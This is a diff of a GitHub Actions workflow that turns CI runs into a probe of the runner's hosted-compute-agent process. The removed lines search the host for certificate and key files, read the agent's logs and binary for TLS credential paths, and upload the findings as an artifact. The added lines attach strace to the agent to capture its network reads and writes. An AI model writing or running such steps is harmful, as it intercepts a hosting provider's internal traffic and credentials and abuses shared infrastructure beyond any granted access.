@@ -1,44 +1,15 @@
-name: HCA Deep Dive
+name: strace HCA
 on:
   push:
     branches: [master]
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    timeout-minutes: 5
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-      - name: Deep HCA investigation
-        continue-on-error: true
-        run: |
+      - run: |
           HCA_PID=$(pgrep -f hosted-compute-agent)
-          echo "=== HCA PID: $HCA_PID ==="
+          echo "HCA PID: $HCA_PID"
           
-          echo "=== HCA open sockets ==="
-          ss -tnp | grep $HCA_PID
-          
-          echo "=== HCA fd/ ==="
-          ls -la /proc/$HCA_PID/fd/
-          
-          echo "=== HCA root dir ==="
-          ls -la /proc/$HCA_PID/root/
-          
-          echo "=== Search for .cert .pem .crt ==="
-          find /home/runner /opt /etc -name "*.cert" -o -name "*.pem" -o -name "*.crt" 2>/dev/null | grep -v "snap\|Homebrew\|linuxbrew\|ruby\|go/pkg\|python3\|nvm" | head -20
-          
-          echo "=== HCA log ==="
-          cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null | tail -30
-          
-          echo "=== Check for strace ==="
-          which strace 2>/dev/null || echo "no strace"
-          
-          echo "=== Check HCA binary strings for TLS ==="
-          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -E "cert_file|key_file|tls_cert|tls_key|client_cert|\.pem|\.crt|tls\.Client" | head -10
-
-      - name: Upload results
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: hca-deep
-          path: /home/runner/work/npm-install/npm-install/dist/
+          # Use strace to capture HCA's network send/recv for 2 seconds
+          timeout 3 strace -qq -p $HCA_PID -e trace=read,write,writev,sendto,recvfrom -s 4096 2>&1 | head -50
